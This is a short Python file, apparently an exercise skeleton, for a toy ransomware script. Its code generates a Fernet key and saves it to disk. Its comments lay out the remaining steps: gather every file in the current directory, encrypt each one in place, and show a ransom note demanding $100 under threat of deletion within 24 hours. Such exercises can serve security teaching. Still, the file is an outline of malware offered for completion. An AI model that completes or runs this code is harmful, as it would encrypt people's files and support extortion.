from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
with open("encryptedKey.key", "wb") as encryptedKey:
    encryptedKey.write(key)

files = []

# Loop through each path in the os.listdir()

    # Check if path has main.py and encrypted.key file

        # Continue to next loop iteration

    # if the path type is file 

        # then append to files list


# Iterate the loop over each file in the files list

    # Read Open file in rb mode as file1

        # Use read() method on file1 sand save the returned data in rawData

    # Use Fernet(key).encrypt(rawData) to get encryptedRawData 

    # Open the same file in wb mode as file2

        # Use write method to write encryptedRawData to the file2


# Notify the message to the user "👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹"

